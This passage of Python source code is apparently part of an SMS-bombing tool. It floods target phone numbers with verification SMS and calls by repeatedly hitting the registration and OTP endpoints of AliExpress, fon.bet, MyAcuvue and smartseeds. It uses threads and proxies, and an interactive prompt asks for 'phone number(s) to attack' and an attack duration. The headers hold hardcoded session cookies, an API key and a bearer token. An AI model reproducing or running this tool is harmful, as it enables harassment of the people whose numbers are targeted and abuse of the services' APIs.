                        'bx-ua': '223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==',
                        'bx-umidtoken': 'T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=',
                        'content-length': '1561',
                        'content-type': 'text/plain;charset=UTF-8',
                        'cookie': 'aer_abid=e7837ca8509e6c9a; acs_usuc_t=x_csrf=3gi48phl5j_s&acs_rt=7122813d0f5b49338fcecc4affd772da; xman_t=RYU45Rw/P4JNJF84NKgT4dq70sIp4TguFPGJj8BZOhkRd0TBje5c2RaODRkrwPhT; xman_f=5un0UFmYvrNgACLBAum4oWM8RAUqunUYiCgw4FGrjNzKARmwUxko2lpQqldFKK5Of1fWk0gHOItRELxCz/Cp/nIE6bPX4/Fo3fBI1z596wNChx5//UL6WQ==; xman_us_f=x_locale=ru_RU&x_l=0&x_c_chg=1&acs_rt=50c77cefad7a4021b41f0f6f2a9ced49; intl_locale=ru_RU; aep_usuc_f=site=rus&c_tp=RUB&region=RU&b_locale=ru_RU; xlly_s=1; intl_common_forever=UYSq6AZOhhaI4ZOz9j5s1/mt5Mkg2bUOF+BzgAF3t937OTKSMIfdaw==; JSESSIONID=44828D31960F5FA579B40154BB4ABEEC; tfstk=cl3CB9geNY3ayZYl-JOwU_f7xbahZx5bNHwnOptNgV0hxclCiSb4hNIrqTUzw51..; l=eBM9vtwITHaZfir8BO5ahurza77TmCOfcsPzaNbMiInca6nOaFiMWNCUvWrpudtjQt5jeEtyLtAZndny8SU3Wtw7VXuPMUGlifppRe1..; isg=BCUlHVXRqkixJ84UtWrpsDHoNOdfYtn0gFsUSCcP6txrPk2w47MwxZUYyLpIPvGs',
                        'origin': 'https://aliexpress.ru',
                        'referer': 'https://aliexpress.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-aer-cna': '-'
                    }

                    payload = {"phone": "7-" + phone[1:], "locale": "ru_RU", "currency": "RUB",
                               "returnURL": "https://aliexpress.ru/", "channel": "CALL", "environment": {
                            "uaEncrpt": "223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==",
                            "umidToken": "T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=",
                            "regSrc": "AE_MAIN_LOGIN", "securityTimestamp": 1668031201204,
                            "refer": "https://aliexpress.ru/",
                            "userAgent": user}}

                    await session.post('https://aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init?_bx-v=2.0.52',
                                  json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '407',
                        'Content-Type': 'text/plain;charset=UTF-8',
                        'Host': 'clientsapi03w.bk6bba-resources.com',
                        'Origin': 'https://www.fon.bet',
                        'Referer': 'https://www.fon.bet/account/registration/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'cross-site',
                        'User-Agent': user
                    }

                    payload = {
                        "advertInfo": "",
                        "birthday": "2000-10-25",
                        "deviceId": "2340BBFFD39BD54C3A914A90D5582A63",
                        "ecupis": True,
                        "email": "",
                        "emailAdvertAccepted": True,
                        "fio": "",
                        "lang": "ru",
                        "password": "Hoho_HO123",
                        "phoneNumber": "+" + phone,
                        "platformInfo": user,
                        "promoId": "",
                        "sysId": 1,
                        "webReferrer": "https://www.fon.bet/"
                    }

                    await session.post('https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess',
                                  json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '29',
                        'content-type': 'application/json',
                        'origin': 'https://www.myacuvue.acuvue.ru',
                        'referer': 'https://www.myacuvue.acuvue.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'user-agent': user,
                        'x-api-key': 'XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu',
                        'x-app-version': 'PWA 2.3.1'
                    }

                    payload = {
                        'phoneNumber': phone
                    }

                    await session.post('https://api.myacuvuepro.ru/myacuvue/oauth/mobile', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    # Smartseeds.ru, has no sms calldown, in theory may sms bomb only with this service ;)
                    header = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '29',
                        'content-type': 'application/json',
                        'Origin': 'https://smartseeds.ru',
                        'Referer': 'https://smartseeds.ru/account/registration',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'user-agent': user,
                        'Authorization': 'Bearer ODFlODkwNjM4YTdmN2E0ZWM1Yjk4YWU1NGY2NDFiZTJiNDFhNDJlZTM1ZDY0NDc5MDYyN2QzYjdlNzI5ZGNhMw'
                    }

                    payload = {
                          "profileDetails": {
                            "individualTaxpayerNumber": "6163027810",
                            "farmer": False,
                            "vatPayer": False,
                            "exportBasis": False
                          },
                          "contactFullName": "Бла бла бла",
                          "email": "testmail@fi.ru",
                          "password": "testpassword1234",
                          "verificationCode": None,
                          "phoneNumber": phone
                    }

                    await session.post('https://smartseeds.ru/api/native/v1.0/cargo-owner/validate', json=payload,
                                       headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()


    def run_thread(self, time_a, phones, use_proxy, proxy=""):
        t = time.monotonic()
        if use_proxy != 'y':
            proxy = ""
        while time.monotonic() - t < time_a:
            asyncio.run(self.sms_thread(phones, use_proxy, proxy))

    def start_sms(self):
        if platform == 'win32':
            os.system("cls")
        else:
            os.system("clear")

        logo_sms()

        if self.lang == 'ru':
            text = "\nНомер(а) телефона(ов) для атаки > "
            text2 = """
╔══════════════════════════════════════════════╗
║Если вы собираетесь указать несоклько номеров,║ 
║     то делайте это в следующем вормате:      ║
║           номер, номер, номер                ║
║                                              ║
║    Формат номера телефона: 79222222222       ║
╚══════════════════════════════════════════════╝
            """
        else:
            text = "\nPhone number(s) to attack > "
            text2 = """
╔═══════════════════════════════════════════════╗
║If you are going to enter more than one number,║ 
║       do it in the following format:          ║  
║           number, number, number              ║
║                                               ║
║      Phone number format: 79222222222         ║
╚═══════════════════════════════════════════════╝            
            """

        print(fade.water(text2))

        phones = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN)
        phones = phones.replace(' ', '')
        phones = phones.split(',')

        if self.lang == 'ru':
            text = 'Использовать прокси? (y/n) > '
            text2 = 'Потоки > '
            text3 = 'Время атаки (в сек.) > '
            text4 = '\n!НЕ РЕКОМЕНДУЕТСЯ!'
            text5 = '\nЗапустить потоки для каждой прокси? (y/n) > '
            text6 = 'поток запущен'
        else:
            text = 'Use proxies? (y/n) > '
            text2 = 'Threads > '
            text3 = 'Time attack (in sec.) > '
            text4 = '\n!NOT RECOMMENDED!'
            text5 = '\nStart threads for every proxy? (y/n) > '
            text6 = 'thread started'

        if not self.proxies:
            use_proxy = 'n'
        else:
            use_proxy = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN).lower()

        self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text2 + Fore.GREEN))
        time_attack = int(input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN))

        if use_proxy == 'y':
            print(Back.RED + Fore.WHITE + text4 + Fore.RESET + Style.RESET_ALL)
            proxy_threads = input(Fore.YELLOW + Style.BRIGHT + text5 + Fore.GREEN).lower()
        else:
            proxy_threads = 'n'

        th = None

        if proxy_threads == 'y':
            for proxy in self.proxies:
                for count in range(self.todo):
                    th = Thread(target=self.run_thread, args=(time_attack, phones, use_proxy, proxy,))
                    th.start()
                    self.started += 1
                    print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                          Fore.YELLOW + Style.BRIGHT + text6)

        else:
            for count in range(self.todo):
                th = Thread(target=self.run_thread, args=(time_attack, phones, use_proxy,))
                th.start()
                self.started += 1
                print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                      Fore.YELLOW + Style.BRIGHT + text6)

        time.sleep(1)

        th.join()
